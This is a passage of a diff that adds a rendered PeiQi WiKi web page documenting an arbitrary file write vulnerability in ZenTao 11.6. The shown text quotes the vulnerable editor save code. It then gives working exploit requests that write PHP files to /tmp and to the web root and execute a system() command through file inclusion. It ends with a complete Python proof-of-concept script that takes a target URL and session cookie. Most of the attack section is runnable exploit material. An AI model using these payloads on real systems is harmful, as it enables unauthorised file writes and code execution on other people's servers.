+        $gibbedEvils = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;e v a l&apos;</span>, <span class="hljs-string">&apos;e x e c&apos;</span>, <span class="hljs-string">&apos; p a s s t h r u&apos;</span>, <span class="hljs-string">&apos; p r o c _ o p e n&apos;</span>, <span class="hljs-string">&apos;s h e l l _ e x e c&apos;</span>, <span class="hljs-string">&apos;s y s t e m&apos;</span>, <span class="hljs-string">&apos;$ $&apos;</span>, <span class="hljs-string">&apos;i n c l u d e&apos;</span>, <span class="hljs-string">&apos;r e q u i r e&apos;</span>, <span class="hljs-string">&apos;a s s e r t&apos;</span>);
+        $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
+        <span class="hljs-keyword">if</span>(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);
+
+        $dirPath = dirname($filePath);
+        $extFilePath = substr($filePath, <span class="hljs-number">0</span>, strpos($filePath, DS . <span class="hljs-string">&apos;ext&apos;</span> . DS) + <span class="hljs-number">4</span>);
+        <span class="hljs-keyword">if</span>(!is_dir($dirPath) <span class="hljs-keyword">and</span> is_writable($extFilePath)) mkdir($dirPath, <span class="hljs-number">0777</span>, <span class="hljs-keyword">true</span>);
+        <span class="hljs-keyword">if</span>(is_writable($dirPath))
+        {
+            file_put_contents($filePath, $fileContent);
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            <span class="hljs-keyword">die</span>(js::alert($this-&gt;lang-&gt;editor-&gt;notWritable . $extFilePath));
+        }
+    }
+</code></pre>
+<p><strong>$filePath&#x53C2;&#x6570;&#x548C;$fileContent&#x53C2;&#x6570;</strong> &#x6211;&#x4EEC;&#x662F;&#x53EF;&#x63A7;&#x7684;</p>
+<p>&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#x5F80; <strong>/tmp</strong>&#x5199;&#x5165;&#x4E00;&#x4E2A;<strong>phpinfo()</strong></p>
+<pre><code>http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php
+
+POST:fileContent=&lt;?php phpinfo();?&gt;
+</code></pre><p><a href="image/zentao-24.png" data-lightbox="c09dc229-e3aa-4783-9ecd-ff130daa135d" data-title=""><img src="image/zentao-24.png" alt=""></a></p>
+<p><a href="image/zentao-25.png" data-lightbox="a8aa7ee2-4bab-4caa-962e-f0e072be3e90" data-title=""><img src="image/zentao-25.png" alt=""></a></p>
+<p>&#x5728;&#x5229;&#x7528; &#x7985;&#x9053; 11.6&#x7248;&#x672C; &#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E; &#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x6CD5;&#x6765;&#x6587;&#x4EF6;&#x5305;&#x542B;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1
+</code></pre><p><a href="image/zentao-26.png" data-lightbox="d5c07020-9fa2-4464-8e74-435e81f50d7f" data-title=""><img src="image/zentao-26.png" alt=""></a></p>
+<p>&#x4E5F;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x7F51;&#x7AD9;&#x76EE;&#x5F55;&#x4E2D;</p>
+<p>&#x5148;&#x83B7;&#x53D6;&#x5730;&#x5740;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell
+
+POST&#xFF1A;fileContent=&lt;?php system(&apos;find / -name ioncube.php&apos;)?&gt;&apos;);?&gt;
+</code></pre><p>&#x8BBF;&#x95EE;<strong><a href="http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1" target="_blank">http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1</a></strong></p>
+<p><a href="image/zentao-27.png" data-lightbox="dc647111-f5be-406e-8ea3-659b6963cee5" data-title=""><img src="image/zentao-27.png" alt=""></a></p>
+<p>&#x5F97;&#x5230;&#x76EE;&#x5F55;&#x4E3A; <strong>/app/zentaopma/www</strong></p>
+<p>&#x8BF7;&#x6C42;&#x6539;&#x4E3A;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell
+
+fileContent=&lt;?php file_put_contents(&apos;/app/zentaopms/www/xxx.php&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;);?&gt;
+</code></pre><p>&#x518D;&#x53BB;&#x8BBF;&#x95EE;<strong><a href="http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1" target="_blank">http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1</a></strong>&#x5219;&#x4F1A;&#x518D;&#x7F51;&#x7AD9;&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210; xxx.php &#x6587;&#x4EF6;</p>
+<p><a href="image/zentao-28.png" data-lightbox="a26fc53b-baf1-4625-a663-7ee7e9c00537" data-title=""><img src="image/zentao-28.png" alt=""></a></p>
+<p><a href="image/zentao-29.png" data-lightbox="5455d413-482e-4120-9aa3-ac6f9e31aec4" data-title=""><img src="image/zentao-29.png" alt=""></a></p>
+<h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;poc">&#x6F0F;&#x6D1E;&#x5229;&#x7528;POC</h2>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-comment">#-*- coding:utf-8 -*-</span>
+<span class="hljs-comment"># author : PeiQi</span>
+<span class="hljs-comment"># from   : http://wiki.peiqi.tech</span>
+
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> sys
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span><span class="hljs-params">()</span>:</span>
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mVersion: zentao version = 11.6                                    \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36m&#x4F7F;&#x7528;&#x683C;&#x5F0F;: python3 poc.py                                            \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mZentaosid   &gt;&gt;&gt; xxxxxxxxxxxxxx(cookie&#x5B57;&#x6BB5;)                          \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url)</span>:</span>
+    version_url = target_url + <span class="hljs-string">&quot;/www/index.php?mode=getconfig&quot;</span>
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+    }
+    <span class="hljs-keyword">try</span>:
+        response = requests.get(url=version_url, timeout=<span class="hljs-number">20</span>, headers=headers)
+        version = json.loads(response.text)[<span class="hljs-string">&apos;version&apos;</span>]
+        print(<span class="hljs-string">&quot;\033[32m[o] &#x7985;&#x9053;&#x7248;&#x672C;&#x4E3A;:{}\033[0m&quot;</span>.format(version))
+
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x83B7;&#x53D6;&#x7248;&#x672C;&#x5931;&#x8D25; \033[0m&quot;</span>, e)
+        sys.exit(<span class="hljs-number">0</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_2</span><span class="hljs-params">(target_url, zentaosid)</span>:</span>
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid={}&quot;</span>.format(zentaosid)
+    }
+    data = {<span class="hljs-string">&quot;fileContent&quot;</span>:<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>}
+    write_url = target_url + <span class="hljs-string">&quot;/api-getModel-editor-save-filePath=/tmp/test&quot;</span>
+    <span class="hljs-keyword">try</span>:
+        response = requests.post(url=write_url, data=data, headers=headers, timeout=<span class="hljs-number">10</span>)
+        print(<span class="hljs-string">&quot;\033[32m[o] &#x5C1D;&#x8BD5;&#x5199;&#x5165;php&#x6587;&#x4EF6;... \033[0m&quot;</span>)
+    <span class="hljs-keyword">except</span>:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x5199;&#x5165;php&#x6587;&#x4EF6;&#x5931;&#x8D25; \033[0m&quot;</span>)
+        sys.exit(<span class="hljs-number">0</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_3</span><span class="hljs-params">(target_url, zentaosid)</span>:</span>
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid={}&quot;</span>.format(zentaosid)
+    }
+    vuln_url = target_url + <span class="hljs-string">&quot;/api-getModel-api-getMethod-filePath=/tmp/test/1&quot;</span>
+    <span class="hljs-keyword">try</span>:
+        response = requests.get(url=vuln_url, headers=headers, timeout=<span class="hljs-number">10</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;System&quot;</span> <span class="hljs-keyword">in</span> response.text:
+            print(<span class="hljs-string">&quot;\033[32m[o] &#x6210;&#x529F;&#x5199;&#x5165;&#x6587;&#x4EF6;&#xFF0C;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;, &#x8BBF;&#x95EE; {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ &#x67E5;&#x770B; \033[0m&quot;</span>.format(target_url))
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;\033[31m[x] &#x8BFB;&#x53D6;php&#x6587;&#x4EF6;&#x5931;&#x8D25; \033[0m&quot;</span>)
+    <span class="hljs-keyword">except</span>:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x8BFB;&#x53D6;php&#x6587;&#x4EF6;&#x5931;&#x8D25; \033[0m&quot;</span>)
+
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    title()
+    target_url = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m&quot;</span>))
+    zentaosid  = str(input(<span class="hljs-string">&quot;\033[35mZentaosid &gt;&gt;&gt; \033[0m&quot;</span>))
+    POC_1(target_url)
+    POC_2(target_url, zentaosid)
+    POC_3(target_url, zentaosid)
+</code></pre>
+<p><a href="image/zentao-30.png" data-lightbox="9a3a38e5-8d87-4107-b9c2-fe2c7af9b596" data-title=""><img src="image/zentao-30.png" alt=""></a></p>
+<footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
+2021-01-13 05:23:59
+</span></footer>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="禅道 11.6版本 SQL注入漏洞.html" class="navigation navigation-prev " aria-label="Previous page: 禅道 11.6版本 SQL注入漏洞">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="禅道 11.6版本 任意文件读取漏洞.html" class="navigation navigation-next " aria-label="Next page: 禅道 11.6版本 任意文件读取漏洞">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"禅道 11.6版本 任意文件写入漏洞","level":"1.3.1.7.2","depth":4,"next":{"title":"禅道 11.6版本 任意文件读取漏洞","level":"1.3.1.7.3","depth":4,"path":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件读取漏洞.md","ref":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件读取漏洞.md","articles":[]},"previous":{"title":"禅道 11.6版本 SQL注入漏洞","level":"1.3.1.7.1","depth":4,"path":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.md","ref":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/wiki"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件写入漏洞.md","mtime":"2021-01-13T05:23:59.512Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-01-13T05:24:45.529Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-accordion/accordionSelector.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
